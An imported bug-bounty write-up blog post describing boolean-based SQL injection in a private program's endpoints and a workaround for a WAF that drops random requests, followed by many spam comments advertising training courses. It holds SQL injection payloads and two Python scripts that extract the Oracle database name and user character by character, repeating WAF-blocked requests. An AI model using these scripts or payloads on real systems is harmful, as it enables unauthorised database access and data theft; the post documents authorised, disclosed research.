---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-25_sql-injection-and-a-silly-waf.md
original_filename: 2018-07-25_sql-injection-and-a-silly-waf.md
title: SQL Injection and A silly WAF
category: documents
detected_topics:
- sqli
- automation-abuse
- cloud-security
- command-injection
- api-security
tags:
- imported
- documents
- sqli
- automation-abuse
- cloud-security
- command-injection
- api-security
language: en
raw_sha256: e6dcc2e31ea8ddc4277cdfda5b67f82d6a3a3a12ef8f93ff4c977ead89be666c
text_sha256: a70125ffa5b14a582deea038c7b3e9ea7339ca3fe25e61a4715bfa1b66f564be
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection and A silly WAF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-25_sql-injection-and-a-silly-waf.md
- Source Type: markdown
- Detected Topics: sqli, automation-abuse, cloud-security, command-injection, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `e6dcc2e31ea8ddc4277cdfda5b67f82d6a3a3a12ef8f93ff4c977ead89be666c`
- Text SHA256: `a70125ffa5b14a582deea038c7b3e9ea7339ca3fe25e61a4715bfa1b66f564be`


## Content

---
title: "SQL Injection and A silly WAF"
url: "https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html"
final_url: "https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html"
authors: ["Mahmoud Gamal (@Zombiehelp54)"]
bugs: ["SQL injection"]
publication_date: "2018-07-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5790
---

###  SQL Injection and A silly WAF 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ July 25, 2018  ](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html "permanent link")

  

  
Hi Folks,  
Today I'll be writing about some interesting SQL injection vulnerabilities I recently found.  
  
This is a private program so I won't be mentioning who the vendor is.  
  

##  #1: WAF? ok!

  

At a lovely hacking night I started testing for a private bug bounty program, after about 30 minutes of throwing random single and double quotes inside all the parameters, one of the endpoints returned an error saying: {"error":"An unexpected error has occured"}  
  
So I looked at the request and set the value of the parameter to `23' and '1'='1` and as expected the endpoint returned valid results which means it's vulnerable to SQL injection!  
  
That's it, a lovely basic Boolean-Based SQL injection let's write the report and get a nice bounty!  
  
But...  
[![Image result for no meme](https://i.kym-cdn.com/entries/icons/original/000/005/997/how_about_no_evil.jpg)](https://i.kym-cdn.com/entries/icons/original/000/005/997/how_about_no_evil.jpg)  
---  
THE WAF!  
  
  
While further exploiting this vulnerability to extract data from the database as a proof of concept, the endpoint was returning {"error":"undergoing corrective maintenance"} even to normal requests without any SQLi payloads. I later realized that this is probably the WAF blocking some random requests when it suspects an IP address which explains why other researchers haven't reported this obvious SQLi before (maybe they thought it was a false-positive. I also thought that, it took me some time to understand what was going on!)  
  
So I wrote a python script that detects when the WAF blocks a request if the response contains "undergoing corrective maintenance" and repeats it until we get response from the server (If we get "Error" or "True" that means we are talking to the server):  
  

  
  
  import requests
  c = {}  # Cookies
  s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789'
  res = ''
  restart = True
  while(restart):
  restart = False
  for i in s:
  if(i == '_'):
  i = '\\_'
  # print i
  p = "23' AND (select lower(ora_database_name) from dual) like '"+str(res)+str(i)+"%" # SQL Query
  try:
  r = requests.post("http://target/vulnerable",data={"serialNumber":p}, headers=c)
  except requests.exceptions.Timeout as e:
  print "Timed out"
  while('undergoing corrective' in r.content): # Silly WAF? repeat the request
  print "Repeating Request"
  r = requests.post("http://target/vulnerable",data={"serialNumber":p}, headers=c)
  if "SESSION_EXPIRED" in r.content:
  print "ERROR - SESSION_EXPIRED"
  break
  if "true" in r.content: ## No error, correct char
  res+=i
  print res , "found"
  restart = True
  break
  

  
The PoC worked, I reported the vulnerability and received the bounty.  
  
I didn't stop right there, now knowing how the WAF works, I kept testing all other endpoints and found a couple more with the same technique.  
  
Ok, that probably was not that hard, let's move on to the next level.  
  

##  #2: Fuck you WAF! 

  

One of the endpoints (a non-json one) was also vulnerable to boolean based sql injection similar to the one above, but the WAF this time was acting differently.  
When my SQL query evaluated to `true` the response had a specific word, let's say `2222`, but when it evaluated to false, the application returned a static error page.  
  
The problem was that the WAF was returning the exact same response as when the query evaluated to false which means I can't differentiate between a response that was sent by the WAF and a response that was sent by the server when the query is evaluated to false as they both are exactly the same! 

  

[![Image result for No god no gif](https://media1.tenor.com/images/dc389d20cfd4ec5ae87eb2e50978e869/tenor.gif?itemid=5914845)](https://media1.tenor.com/images/dc389d20cfd4ec5ae87eb2e50978e869/tenor.gif?itemid=5914845)

  

I kept trying to bypass the WAF but no luck, it was returning the same error page for random requests even when the query evaluated to true so I wasn't able to extract anything from the database.  
  
I was about to give up when I came across an idea to write a python script that repeats any request that returns an error page (which means the query was evaluated to false) for 5 times to make sure we get response from the server not the WAF since the WAF was blocking random requests and it actually WORKED!

  

  
  
  import requests
  
  c = {} # cookies
  s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789'
  res = ''
  restart = True
  x = 0
  r = ''
  while(restart):
  restart = False
  for i in s:
  x = 0
  if(i == '_'):
  i = '\\_'
  p = "6214111' and (SELECT lower(user) from dual) like '"+str(res)+str(i)+"%,2222" # SQL Query
  try:
  r = requests.post("https://target/vulnerable2/",data={"Nbr":p}, headers=c)
  except requests.exceptions.Timeout as e:
  print "Timed out"
  if "2222" not in r.content:
  while("2222" not in r.content and x < 5): ## repeat 5 times to make sure we are talking to the server :)  
  r = requests.post("https://target/vulnerable2/",data={"Nbr":p}, headers=c)
  x += 1
  else:
  res+=str(i)
  print res , "found"
  restart = True
  break
  if "2222" in r.content:
  res+=str(i)
  print res , "found"
  restart = True
  break

  

Again, bug hunted, silly WAF beaten, report sent and bounty granted!  
  

I wanted to write about another interesting SQL injection on the same program but since it's a little bit different and has nothing to do with the WAF, I will keep it for the next post.  
  
That's it for today, if you have any questions drop me a tweet [@Zombiehelp54](https://twitter.com/Zombiehelp54)

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://draft.blogger.com/profile/17794166287154641473)[March 17, 2019 at 9:51 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1552884700365#c7931304702154980664)

Hi sir .I think i found boolen based sql injection but problem is it is in image download functionality.so when I try to use version() in vulnerable column it isn't printing version.please help 

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7931304702154980664)

Replies

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[sathyaramesh](https://draft.blogger.com/profile/10058306593174094967)[April 9, 2019 at 11:27 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1554877636634#c7492322380298568424)

I am reading your post from the beginning, it was so interesting to read & I feel thanks to you for posting such a good blog, keep updates regularly.  
[Ethical Hacking Course in Chennai](https://www.fitaacademy.com/courses/ethical-hacking-course-chennai/)  
[Hacking Course in Chennai](https://www.fitaacademy.com/courses/ethical-hacking-course-chennai/)  
[Hacking Classes in Chennai](https://www.fitaacademy.com/courses/ethical-hacking-course-chennai/)  
[Blue Prism Training in Chennai](https://www.fitaacademy.com/courses/blueprism-training-in-chennai/)  
[CCNA Course in Chennai](https://www.fitaacademy.com/courses/ccna-training-in-chennai/)  
[Cloud Computing Training in Chennai](https://www.fitaacademy.com/courses/cloud-computing-training-in-chennai/)  
[Ethical Hacking Training in OMR](https://www.fitaacademy.com/courses/ethical-hacking-course-chennai/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7492322380298568424)

Replies

Reply

  3. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Linda](https://draft.blogger.com/profile/14556945841518785468)[May 5, 2019 at 3:50 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557096635982#c5856683257027466147)

Noice

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/5856683257027466147)

Replies

Reply

  4. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Linda](https://draft.blogger.com/profile/14556945841518785468)[May 5, 2019 at 3:53 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557096824917#c7748062853377832788)

This comment has been removed by the author.

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7748062853377832788)

Replies

Reply

  5. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Linda](https://draft.blogger.com/profile/14556945841518785468)[May 5, 2019 at 3:57 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557097069950#c337390414848483000)

This comment has been removed by the author.

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/337390414848483000)

Replies

Reply

  6. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Linda](https://draft.blogger.com/profile/14556945841518785468)[May 5, 2019 at 3:59 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557097152724#c4731785860494423993)

This comment has been removed by the author.

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/4731785860494423993)

Replies

Reply

  7. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Linda](https://draft.blogger.com/profile/14556945841518785468)[May 5, 2019 at 4:02 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557097347232#c355199495044986005)

This comment has been removed by the author.

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/355199495044986005)

Replies

Reply

  8. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[sheela rajesh](https://draft.blogger.com/profile/11566184031808028507)[May 10, 2019 at 9:52 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1557550361029#c1224321457071018769)

Your blog is more informative and inspirational to others.it gives wish to know more about this.  
[JAVA Training in Chennai](https://www.fita.in/java-and-j2ee-training-in-chennai/)  
[JAVA Training in Tnagar](https://www.fita.in/java-and-j2ee-training-in-chennai/)  
[Selenium Training in Chennai](https://www.fita.in/selenium-training-in-chennai/)  
[Digital Marketing Course in Chennai](https://www.fita.in/digital-marketing-training-in-chennai/)  
[Python Training in Chennai](https://www.fita.in/python-training-in-chennai/)  
[Big data training in chennai](https://www.fita.in/big-data-hadoop-training-in-chennai/)  
[JAVA Training in Chennai](https://www.fitaacademy.com/courses/java-j2ee-training-in-chennai/)  
[Java Training in Velachery](https://www.fitaacademy.com/courses/java-j2ee-training-in-chennai/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/1224321457071018769)

Replies

Reply

  9. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[sathyaramesh](https://draft.blogger.com/profile/10058306593174094967)[July 5, 2019 at 11:45 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1562395536755#c9041495513091793796)

Nice blog!! I hope you will share more info like this. I will use this for my studies and research.  
[DevOps Training in Chennai](https://www.fita.in/devops-training-in-chennai/)  
[DevOps foundation certification](https://www.fita.in/devops-training-in-chennai/)  
[DevOps certification](https://www.fita.in/devops-training-in-chennai/)  
[AWS Training in Chennai](https://www.fita.in/amazon-web-services-training-in-chennai/)  
[Cloud Computing Training in Chennai](https://www.fita.in/cloud-computing-training-in-chennai/)  
[Data Science Training in Chennai](https://www.fita.in/data-science-course-in-chennai/)  
[DevOps Training in Anna Nagar](https://www.fita.in/devops-training-in-chennai/)  
[DevOps Training in Vadapalani](https://www.fita.in/devops-training-in-chennai/)  
[DevOps Training in Guindy](https://www.fita.in/devops-training-in-chennai/)  
[DevOps Training in Thiruvanmiyur](https://www.fita.in/devops-training-in-chennai/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/9041495513091793796)

Replies

Reply

  10. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[cynthiawilliams](https://draft.blogger.com/profile/07426948788713977442)[July 6, 2019 at 5:59 AM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1562417994187#c5255188309132648014)

Learned a lot from your post and it is really good. Share more tech updates regularly.  
[ Ethical Hacking course in Chennai ](https://www.fita.in/ethical-hacking-course-in-chennai/)  
[ Ethical Hacking Training in Chennai ](https://www.fita.in/ethical-hacking-course-in-chennai/)  
[ Hacking course in Chennai ](https://www.fita.in/ethical-hacking-course-in-chennai/)  
[ ccna course in Chennai ](https://www.fita.in/ccna-training-in-chennai/)  
[ Salesforce Training in Chennai ](https://www.fita.in/salesforce-training-chennai/)  
[ AngularJS Training in Chennai ](https://www.fita.in/angularjs-training-in-chennai/)  
[ PHP Training in Chennai ](https://www.fita.in/php-training-in-chennai/)  
[ Ethical Hacking course in Tambaram ](https://www.fita.in/ethical-hacking-course-in-chennai/)  
[ Ethical Hacking course in Velachery ](https://www.fita.in/ethical-hacking-course-in-chennai/)  
[ Ethical Hacking course in T Nagar ](https://www.fita.in/ethical-hacking-course-in-chennai/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/5255188309132648014)

Replies

Reply

  11. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Rasi](https://draft.blogger.com/profile/02342861661222587588)[August 19, 2019 at 3:13 AM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1566209626932#c3922988366111383590)

Thanks for sharing this Informative content.  
[Power BI Training In Hyderabad](http://www.powerbitraining.in/powerbi-training-in-hyderabad/)  
[Power BI Training](http://www.powerbitraining.in/powerbi-training-in-hyderabad/)  
[Power BI Online Training](http://www.powerbitraining.in/powerbi-training-in-hyderabad/)  
[Power BI Training Online](http://www.powerbitraining.in/powerbi-training-in-hyderabad/)  

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/3922988366111383590)

Replies

Reply

  12. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Anbarasan14](https://draft.blogger.com/profile/04098590361628309774)[September 3, 2019 at 11:09 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1567577353404#c7351309564846761675)

Thanks for your blog; I really prefer this blog for my future reference.  
[English Speaking Classes in Mulund](https://englishlabs.in/english-speaking-classes-mulund/)  
[IELTS Classes in Mulund](https://englishlabs.in/ielts-coaching-mulund/)  
[German Classes in Mulund](https://englishlabs.in/german-classes-mulund/)  
[French Classes in Mulund](https://englishlabs.in/french-classes-mulund/)  
[Spoken English Classes in Chennai](https://englishlabs.in/spoken-english-classes-chennai/)  
[IELTS Coaching in Chennai](https://englishlabs.in/ielts-training-chennai/)  
[English Speaking Classes in Mumbai](https://englishlabs.in/spoken-english-classes-mumbai/)  
[IELTS Classes in Mumbai](https://englishlabs.in/ielts-training-mumbai/)  
[Spoken English Class in Anna Nagar](https://englishlabs.in/spoken-english-classes-anna-nagar/)  
[IELTS Coaching in Tambaram](https://englishlabs.in/ielts-training-tambaram/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7351309564846761675)

Replies

Reply

  13. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[kaushik](https://draft.blogger.com/profile/17027145916920219312)[September 5, 2019 at 2:27 AM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1567675655686#c8892489639186344642)

Awesome article! You are providing us very valid information. This is worth reading. Keep sharing more such articles.  
[Automation Anywhere Training in Chennai](https://www.fita.in/automation-anywhere-training-in-chennai/)  
[Automation courses in Chennai](https://www.fita.in/automation-anywhere-training-in-chennai/)  
[Machine Learning Training in Chennai](https://www.fita.in/machine-learning-course-in-chennai/)  
[Blue Prism Training in Chennai](https://www.fita.in/blue-prism-training-in-chennai/)  
[UiPath Training in Chennai](https://www.fita.in/uipath-training-in-chennai/)  
[Automation Anywhere Training in OMR](https://www.fita.in/automation-anywhere-training-in-chennai/)  
[Automation Anywhere Training in Porur](https://www.fita.in/automation-anywhere-training-in-chennai/)  
[Automation Anywhere Training in T Nagar](https://www.fita.in/automation-anywhere-training-in-chennai/)  
[Automation Anywhere Training in Velachery](https://www.fita.in/automation-anywhere-training-in-chennai/)  
  

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/8892489639186344642)

Replies

Reply

  14. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[rtusharkumarrastogi](https://draft.blogger.com/profile/17523047820737486405)[January 13, 2020 at 9:13 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1578978835072#c7705887886465917116)

  
Thank you for this great information. I’ve only had one Ultrasound guided injection my hip one time. I’ve been considering it for other issues and this information has been very helpful, things I didn’t know about.  
Regards  
[Ultrasound guided injection](https://www.kentmskclinic.co.uk/ultrasound-guided-injections/)  

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7705887886465917116)

Replies

Reply

  15. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[datasciencecourse](https://draft.blogger.com/profile/11872246717663588322)[January 28, 2020 at 10:34 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1580279688864#c1260850627637434665)

After reading your article I was amazed. I know that you explain it very well. And I hope that other readers will also experience how I feel after reading your article.  
[artificial intelligence course in mumbai](https://www.excelr.com/artificial-intelligence-ai-course-training-in-mumbai/)  
  
[machine learning courses in mumbai](https://www.excelr.com/machine-learning-course-training-in-mumbai/)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/1260850627637434665)

Replies

Reply

  16. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[digitaltucr](https://draft.blogger.com/profile/10778525488554428492)[January 29, 2020 at 9:49 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1580363345857#c5250044161271143545)

I finally found great post here.I will get back here. I just added your blog to my bookmark sites. thanks.Quality posts is the crucial to invite the visitors to visit the web page, that's what this web page is providing.  
[ExcelR Data Science training in Mumbai](https://www.excelr.com/data-science-course-training-in-mumbai)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/5250044161271143545)

Replies

Reply

  17. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[rama venkata](https://draft.blogger.com/profile/15661484308423327982)[February 23, 2020 at 9:22 PM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1582521773775#c7369310874017120244)

Great blog!!try to create a blog for digital marketing and post  
Digital marketing course in Hyderabad-360DigiTMG

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/7369310874017120244)

Replies

Reply

  18. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[bavisthra](https://draft.blogger.com/profile/09351928101331879545)[March 13, 2020 at 12:04 AM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1584083087334#c2514385639282138199)

Study Artificial Intelligence Course with ExcelR where you get a great experience and better knowledge.  
[**Artificial Intelligence Course**](https://www.excelr.com/artificial-intelligence-ai-course-training-in-bangalore)  
  
Location 1:  
[ExcelR - Data Science, Data Analytics Course Training in Bangalore 49, 1st Cross, 27th Main BTM Layout stage 1 Behind Tata Motors Bengaluru, Karnataka 560068 Phone: 096321 56744 Hours: Sunday - Saturday 7AM - 11PM](https://g.page/ExcelRSolutionsBanaglore)  
  
Location 2:  
[ExcelR #49, Ground Floor, 27th Main, Near IQRA International School, opposite to WIF Hospital, 1st Stage, BTM Layout, Bengaluru, Karnataka 560068 Phone: 070224 51093 Hours: Sunday - Saturday 7AM - 10PM](https://g.page/r/CfHt1XHXKkVfEAE)

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/2514385639282138199)

Replies

Reply

  19. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[dataexpert](https://draft.blogger.com/profile/14803935784797082153)[March 26, 2020 at 1:43 AM](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html?showComment=1585212202068#c317657481612035784)

  
Very nice job... Thanks for sharing this amazing and educative blog post![ExcelR Digital Marketing Class In Pune](https://www.excelr.com/digital-marketing-training-in-pune/)  

Reply[Delete](https://draft.blogger.com/comment/delete/277132840497237240/317657481612035784)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://draft.blogger.com/comment/frame/277132840497237240?po=5991754527346911312&hl=en&saa=85391&origin=https://mahmoudsec.blogspot.com&skin=contempo)
